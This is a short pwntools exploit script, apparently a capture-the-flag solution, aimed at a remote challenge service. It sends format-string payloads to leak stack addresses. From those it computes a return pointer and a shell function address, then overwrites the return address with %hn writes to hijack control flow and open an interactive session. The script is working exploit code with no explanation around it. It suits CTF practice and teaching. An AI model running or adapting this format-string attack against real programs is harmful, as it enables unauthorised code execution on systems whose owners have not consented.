from pwn import *
#io = process("spd_b",aslr=False)
io = remote("spdb-1.play.hfsc.tf",40002)

io.sendlineafter("guess:","%38$X%39$X")
io.recv(1)
retPtr = int(io.recv(8),16) + 0x14
shell = int(io.recv(8),16) - 236

log.info("main retPtr : " + hex(retPtr))
log.info("shell func : " + hex(shell))


# Overwrite %12s
#gdb.attach(io,gdbscript="break *0x56556474")
io.sendlineafter("guess:","%29477x%40$n")


overwriteRet  = p32(retPtr) + p32(retPtr+2) + b"%" + bytes(str((shell >> 16) - 8),"utf-8") 
overwriteRet += b"x%5$hn"

printNBytes = (shell & 0xffff) - (shell >> 16)
overwriteRet += b"%" + bytes(str(printNBytes),"utf-8") + b"x%4$hn"

io.sendlineafter("guess:",overwriteRet)
io.interactive()

